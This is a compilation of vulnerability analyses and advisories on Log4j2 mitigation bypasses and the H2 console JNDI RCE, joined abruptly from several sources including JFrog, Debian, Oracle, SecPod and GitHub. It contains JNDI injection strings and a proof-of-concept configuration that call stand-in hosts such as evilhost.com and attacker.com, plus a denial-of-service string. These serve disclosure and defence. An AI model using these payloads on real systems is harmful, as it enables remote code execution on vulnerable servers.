### Exploiting Log4j2 2.15.0 for remote code execution

Log4j2 2.15.0 added a [few important mitigations](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3) to deny exploitation of Log4Shell (CVE-2021-44228). These are the added mitigations and their current bypass status –

1. 1. Message lookups are disabled by default – Can be bypassed in specific configurations  (CVE-2021-45046 and more)

1. 1. `allowedJndiProtocols` – JNDI only allowed the following protocols by default – LDAP, LDAPS, Java (local) – No known bypass

1. 1. `allowedLdapHosts` – JNDI over LDAP may only access the local host by default (127.0.0.1/localhost) – Can be bypassed in specific operating systems (macOS, FreeBSD, Fedora, Arch Linux and Alpine Linux)

1. 1. `allowedLdapClasses` – JNDI over LDAP may only load Java primitive classes by default – Can always be bypassed

Due to the bypasses of mitigations #3 and #4, CVE-2021-45046 was upgraded from “Low” (3.7) severity to “Critical” (9.0) severity, **since exploiting it immediately leads to RCE**. That being said, as we mentioned above we still consider the prerequisites for the exploitation of CVE-2021-45046 as highly unlikely, due to them requiring a rare non-default configuration.

Here are some more details about the specific bypasses –

#### Message lookups are disabled by default

This mitigation can be bypassed by –

1. 1. Any one of the configurations specified in Appendix C

1. 1. If the application explicitly allowed for message lookup, by defining a pattern layout containing `%m{lookups}` in one of the configuration files. For example – `appender.console.layout.pattern = %m{lookups}`

As mentioned, bypassing this mitigation in Log4j2 2.15.0 currently directly leads to RCE.

####

#### JNDI over LDAP may only access the local host by default

As tweeted by @marcioalm, an attack string similar to `${jndi:ldap://127.0.0.1#evilhost.com:1389/a}` will bypass the localhost restriction, but end up contacting the remote `evilhost.com` We were able to reproduce this bypass only when the vulnerable application runs on macOS and FreeBSD. External sources have also reported Fedora, Arch Linux and Alpine Linux as vulnerable. On other operating systems Java throws an `UnknownHostException` (tested on Ubuntu, Debian & Windows)

####

#### JNDI over LDAP may only load Java primitive classes by default

Note that both of the following bypasses will work on version 2.16.0 as well, if JNDI has been enabled by a non-default configuration

##### Bypass #1 – Time-of-check, Time-of-use attack

This vulnerability was independently discovered and disclosed to Apache by JFrog’s security research team and other security researchers.

The class-loading mitigation introduced in version 2.15.0 first inspects the requested LDAP attributes by calling [getAttributes](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3#diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51R222) and later loads the class/object specified by LDAP by calling [lookup:](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3#diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51R257)

```

if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
	if (!allowedHosts.contains(uri.getHost())) {
		LOGGER.warn("Attempt to access ldap server not in allowed list");
		return null;
	}
	// GET THE CLASS ATTRIBUTES
	Attributes attributes = this.context.getAttributes(name);
	if (attributes != null) {
		// CLASS LOADING CHECKS HERE
		...
	}
	...
}
...
// LOAD THE CLASS
return (T) this.context.lookup(name);
...

```

However – **both the getAttributes and lookup calls will cause separate LDAP requests to be sent**

A malicious server is not required to send back the same LDAP response for both the `getAttributes` and `lookup` requests.

Therefore – an attacker can easily implement an LDAP server which operates as follows –

* On LDAP request #1 – Send back a response with NULL attributes (will cause the package code to skip all attributes checking)
* On LDAP request #2 – Send back a malicious response (ex. the attacker’s URL in `javaCodeBase`)

![Log4shell vulnerability - Time-of-Check, Time-of-Use (ToCToU) attack](data:image/svg+xml...)![Log4shell vulnerability - Time-of-Check, Time-of-Use (ToCToU) attack](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/28004241/Log4Shell_bypass.png)

This is a classic Time-of-Check, Time-of-Use (ToCToU) attack, albeit without a race condition as the attacker’s server is consulted synchronously.

Advantages – Does not rely on a “gadget” class being available in the classpath of the vulnerable application

Disadvantages – Loading a remote codebase is blocked in newer Java versions (where `trustURLCodebase` is false)

##### Bypass #2 – Using serialized objects with a forged name

When deserializing an embedded Java object, the check for the object’s class [was implemented in an incomplete manner](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3#diff-271353c1076e53f6893261e4420de27d34588bfd782806b5c66a3465c43b7f51R235), since the class comparison is done by name only:

```

if (attributeMap.get(SERIALIZED_DATA) != null) {
	if (classNameAttr != null) {
		String className = classNameAttr.get().toString();
		if (!allowedClasses.contains(className)) {
			LOGGER.warn("Deserialization of {} is not allowed", className);
			return null;
		}

```

Therefore – an attacker can specify an arbitrary serialized object in the LDAP response,  but set the `javaClassName` to one of the primitive types to bypass the check – `private static final List permanentAllowedClasses = Arrays.asList(Boolean.class.getName(),

Byte.class.getName(), Character.class.getName(), Double.class.getName(), Float.class.getName(),

Integer.class.getName(), Long.class.getName(), Short.class.getName(), String.class.getName());`

Similarly to the previous serialized object bypass, this relies on the victim having the appropriate “gadget” class of the serialized object in the local classpath.

Advantages – Works on newer Java versions (where `trustURLCodebase` is false)

Disadvantages – Relies on a “gadget” class being available in the classpath of the vulnerable application

#### Appendix E –

### Impact analysis of CVE-2021-45105 in Log4j2

Recently, a new denial of service CVE in Log4j2 was published – CVE-2021-45105, with CVSS 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H). The JFrog security team has validated the CVE data and claims on version 2.16.0, and estimated a CVSS of 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L). This estimation is based on the following –

#### CVE**-2021-45105** Prerequisites

Although not explicitly specified in the CVE, the prerequisites for this attack are exactly the same as CVE-2021-45046 – namely, the attacker must control a non-message part of one of the pattern layouts. Therefore, the exploitation case mentioned in the CVE (“attacker with control over Thread Context Map”) is only one of the applicable cases. In reality, an attacker can abuse any non-default configuration as specified in [Appendix C](#appendix-c). For example – a configured pattern with a `MapMessage` will also make the application vulnerable to this CVE (as long as the attacker controls the tainted variable)  – `appender.console.layout.pattern = ${map:tainted} - %-5p %c{1}:%L - %m%n` From our perspective, the requirement for such a non-default (and unlikely) configuration raises the attack complexity of this issue to “High”.

#### Denial-of-Service impact

Running the public exploit string – `${::-${::-${}}}` on a vulnerably-configured Log4j2 version 2.16.0, yields an `IllegalStateException` – ![Denial of service impact](data:image/svg+xml...)![Denial of service impact](https://speedmedia.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/media.jfrog.com/wp-content/uploads/2021/12/19143522/CVE-2021-45105_exception.png) The PoC string does not cause any excessive CPU or memory usage, and as such the DoS impact (if any) should not have any system-wide impact. Since by default exceptions are ignored in Log4j2 Appenders (logged only, not thrown) , the thrown exception does not crash the server and as such the DoS impact is completely mitigated:

```
private void handleAppenderError(final LogEvent event, final RuntimeException ex) {
    appender.getHandler().error(createErrorMsg("An exception occurred processing Appender "), event, ex);
    if (!appender.ignoreExceptions()) { // ignoreExceptions=true, by default
        throw ex;
    }
}
```
####

#### Official Fix

The issue can be fixed by upgrading Log4j2 to version 2.17.0.

The official fix (version 2.17.0) changes the `StrSubstitutor`  logic to handle the PoC’s edge case, and does not throw any exceptions when faced with a similar input.

For legacy (Java 7) users, it has been hinted that version 2.12.3 will be released to fix this issue, although at the time of writing no such version is available.

#### Mitigations **of CVE****-2021-45105**

Note that this issue is not related to JNDI, and as such all previous proposed mitigations (ex. removing the `JndiLookup` class) will not mitigate this issue.

To mitigate this issue, in non-default cases where the exception is not ignored, vendors can wrap the logging code with an exception handler, so that DoS will not occur.

To summarize – this CVE currently does not seem to pose a real-world threat to production web applications.

As mentioned, JFrog’s real-world estimated CVSS is 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L)

We advise vendors to focus on upgrading any older Log4j2 deployments to 2.16.0, before tackling the task of upgrading 2.16.0 deployments to 2.17.0.

#### Appendix G –

### Impact analysis of CVE-2021-44832

An additional remote code execution CVE in Log4j2 2.17.0 was published – [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/CVE-2021-44832), with CVSS 6.6 (AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H).

The CVE was fixed in versions 2.17.1 (Java 8), 2.13.4 (Java 7) and 2.3.2 (Java 6).

The CVE has extremely high prerequisites (detailed below) and as such is unlikely to affect any real-world system.

At this point, we do not believe upgrading from Log4j2 2.17.0 (or equivalent versions) is critical.

#### CVE**-2021-44832** Prerequisites

Currently, exploitation of the vulnerability is possible only if the attacker has direct control of Log4J’s configuration file, and specifically if the attacker can add a “[JDBCAppender](https://logging.apache.org/log4j/2.x/manual/appenders.html#JDBCAppender)” with arbitrary attributes.

The vulnerability is caused due to the “JDBCAppender” accepting a JNDI data source in its `DataSource` attribute.

When accessing a JNDI data source, remote protocols (such as LDAP) are still available, which means that specifying a string such as `ldap://attacker.com:1337` will cause the vulnerable app to contact the attacker’s server, which can provide a remote class or serialized object to load.

#### PoC

This is an extremely minimal configuration file that will trigger the vulnerability:

```

<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN" name="Config1">
  <Appenders>
    <JDBC name="jdbcTest">
      <DataSource jndiName="ldap://attacker.com:1337/Exploit" />
    </JDBC>
  </Appenders>
</Configuration>

```

As mentioned, Log4j can be configured via many different formats (JSON, YAML, properties, etc.), therefore this is just one example of a working PoC.

Note that the vulnerable application does not actually have to log anything, but the logger does need to be initialized, for example like so –

`Logger logger = LogManager.getLogger("HelloWorld");`

####

#### **CVE****-2021-44832** Official Fix

The issue can be fixed by upgrading Log4j2 to version 2.17.1 (Java 8), 2.13.4 (Java 7) or 2.3.2 (Java 6).

The [official fix](https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16) disables the JNDI support for the JDBCAppender (by default) and adds a system property called `log4j2.enableJndiJdbc` that allows re-enabling it.

In addition, JDBC now reuses the common `JNDIManager` class, which means all previous restrictions on JNDI will apply, even when “enableJndiJdbc” is configured (ex. only the local `java` protocol is allowed in connection strings)

####

#### Mitigations of **CVE****-2021-44832**

Similarly to the well-known Log4Shell mitigation, it is possible to remove the “JdbcAppender.class” file from the Log4J JAR file –

`find ./ -type f -name "log4j-core-*.jar" -exec zip -q -d "{}" org/apache/logging/log4j/core/appender/db/jdbc/JdbcAppender.class \;`

CVE ID         : CVE-2021-42392 CVE-2022-23221
Debian Bug     : 1003894

Security researchers of JFrog Security and Ismail Aydemir discovered two
remote code execution vulnerabilities in the H2 Java SQL database engine
which can be exploited through various attack vectors, most notably through
the H2 Console and by loading custom classes from remote servers through
JNDI. The H2 console is a developer tool and not required by any reverse-
dependency in Debian. It has been disabled in (old)stable releases.
Database developers are advised to use at least version 2.1.210-1, currently
available in Debian unstable.

For Debian 9 stretch, these problems have been fixed in version
1.4.193-1+deb9u1.

We recommend that you upgrade your h2database packages.

## Oracle Critical Patch Update Advisory - April 2022

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Enterprise Manager Risk Matrix

This Critical Patch Update contains 10 new security patches for Oracle Enterprise Manager.  7 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  None of these patches are applicable to client-only installations, i.e., installations that do not have Oracle Enterprise Manager installed. The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#EM)

Oracle Enterprise Manager products include Oracle Database and Oracle Fusion Middleware components that are affected by the vulnerabilities listed in the Oracle Database and Oracle Fusion Middleware sections. The exposure of Oracle Enterprise Manager products is dependent on the Oracle Database and Oracle Fusion Middleware versions being used. Oracle Database and Oracle Fusion Middleware security updates are not listed in the Oracle Enterprise Manager risk matrix. However, since vulnerabilities affecting Oracle Database and Oracle Fusion Middleware versions may affect Oracle Enterprise Manager products, Oracle recommends that customers apply the April 2022 Critical Patch Update to the Oracle Database and Oracle Fusion Middleware components of Enterprise Manager. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2844807.1](https://support.oracle.com/rs?type=doc&id=2844807.1 ) .

# Log4Shell-Critical Remote Code Execution Vulnerability in H2database Console

* Post author:[Keshav R](https://www.secpod.com/blog/author/keshav-r/ "Posts by Keshav R")
* Post published:January 10, 2022
* Reading time:5 mins read

**JFrog** has recently disclosed a remote code execution vulnerability on [H2 Database consoles](https://h2database.com/html/main.html). This is based on a Java Naming and Directory Interface(JNDI) vulnerability, and its root cause is similar to the recent **Log4Shell** vulnerability in Apache **Log4j**. H2 is an open-source RDBMS  in Java that offers a lightweight in-memory solution, making it a popular data storage solution for Web and IoT platforms. The com.h2database:h2 package is among the top 50 most popular Maven packages, with almost **7000** artifact dependencies. [Vulnerability Management Software](https://www.secpod.com/vulnerability-management/) is the solution to this problem.

The detected vulnerability is being tracked by CVE-[2021-42392](https://scaprepo.com/control.jsp?command=search&search=CVE-2021-26084) and is based on an Unauthenticated Remote Code Execution(RCE) vulnerability. This is caused by **org.h2.util.JdbcUtils.getConnection** method present in the H2 Database, which takes the driver’s class name and URL of the Database; these parameters are **not filtered**. Moreover, the lookup of URLs is done **before** the username and password can be validated. The RCE vulnerability is triggering when a malicious user passes a JNDI driver name and a URL link to a remote LDAP/RMI server. Such methods are of use extensively in the H2 Database, opening up many attack vectors. Most notable among them is using the H2 Console leading to the Unauthenticated RCE. To prevent such attacks from happening, you can deploy patches automatically with a sound [patch management tool](https://www.secpod.com/patch-management/).

---

## Root Cause Analysis

The root cause is similar to Log4Shell. Passing unfiltered URLs to the **javax.naming.Context.lookup** function which contains remote codebase loading. Specifically, the **org.h2.util.JdbcUtils.getConnection** method takes a driver class name and database URL as parameters. Suppose the driver’s class CVE-2021-42392 is assignable to the **javax.naming.Context** class, the method instantiates an object from it and calls its lookup method:

```
else if (javax.naming.Context.class.isAssignableFrom(d)) {
    // JNDI context
    Context context = (Context) d.getDeclaredConstructor().newInstance();
    DataSource ds = (DataSource) context.lookup(url);
    if (StringUtils.isNullOrEmpty(user) && StringUtils.isNullOrEmpty(password)) {
        return ds.getConnection();
    }
    return ds.getConnection(user, password);
}
```

They were supplying a driver class such as **javax.naming.InitialContext** and a URL such as **ldap://attacker.com/Exploit**, which leads to a remote code execution.

## JNDI Exploit Flowchart

[![JNDI Exploit Flowchart](https://www.secpod.com/blog/wp-content/uploads/2022/01/H2_JNDI_Vuln.jpg)](https://www.secpod.com/blog/wp-content/uploads/2022/01/H2_JNDI_Vuln.jpg)

Credits: thehackernews

As stated above, the respective method doesn’t safely handle the class name and URL parameters. So when a malicious attacker-control URL is coming, its lookup happens before the credentials can be of validation. Thus, an LDAP Query is sent to the malicious link, and the response received is a **javaClassName** where the malicious class containing the code to be executed is present. H2 Database will now try to fetch this by sending out an HTTP GET request. Once the class is transfering, the execution of the code is on the server.

[CVE-2021-42392](https://scaprepo.com/control.jsp?command=search&search=CVE-2021-26084) has three limitations that should make this issue less widespread when compared to Log4Shell:

1. The scope of the attack is “**direct,**” and servers that process the initial request, the H2 Console, will be of impact. This makes it easy to find the vulnerable server, as other servers will not be of impact.
2. H2 databases are not **vulnerable by default,** as they only listen to local host connections. However, it can be easily change to listen for remote connections.
3. Most vendors run the H2 Database but may not run the H2 Console. Vectors exploiting without the Console are of context-dependency and less likely to be exposing to all the remote attackers.

---

## Affect Products

* H2 Database
* H2 Console
* H2 Shell

---

## Impact

A malicious user could exploit this Remote Code Execution vulnerability to gain unauthorized access to the server, steal user data, and cause undesirable side effects on the vulnerable machine.

---

## Solution

H2 Database has **released the [security fix](https://www.secpod.com/patch-management/)** for this vulnerability in version [2.0.206](https://github.com/h2database/h2database/releases/tag/version-2.0.206). It is a recommendation that all users, whether those using H2 Console directly or not, **upgrade** their instances to the patched version **ASAP**. Therefore the fix is to have JNDI URLs only use (**local**) Java protocol.

# RCE in H2 Console

Critical

[katzyn](/katzyn)
published
GHSA-h376-j262-vhq6
Jan 5, 2022

## Package

maven

com.h2database:h2
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

1.1.100-2.0.204

## Patched versions

2.0.206

## Description

### Impact

H2 Console in versions since 1.1.100 (2008-10-14) to 2.0.204 (2021-12-21) inclusive allows loading of custom classes from remote servers through JNDI.

H2 Console doesn't accept remote connections by default. If remote access was enabled explicitly and some protection method (such as security constraint) wasn't set, an intruder can load own custom class and execute its code in a process with H2 Console (H2 Server process or a web server with H2 Console servlet).

It is also possible to load them by creation a linked table in these versions, but it requires `ADMIN` privileges and user with `ADMIN` privileges has full access to the Java process by design. These privileges should never be granted to untrusted users.

### Patches

Since version 2.0.206 H2 Console and linked tables explicitly forbid attempts to specify LDAP URLs for JNDI. Only local data sources can be used.

### Workarounds

H2 Console should never be available to untrusted users.

`-webAllowOthers` is a dangerous setting that should be avoided.

H2 Console Servlet deployed on a web server can be protected with a security constraint:

<https://h2database.com/html/tutorial.html#usingH2ConsoleServlet>

If `webAllowOthers` is specified, you need to uncomment and edit `<security-role>` and `<security-constraint>` as necessary. See documentation of your web server for more details.

### References

This issue was found and privately reported to H2 team by [JFrog Security](https://www.jfrog.com/)'s vulnerability research team with detailed information.
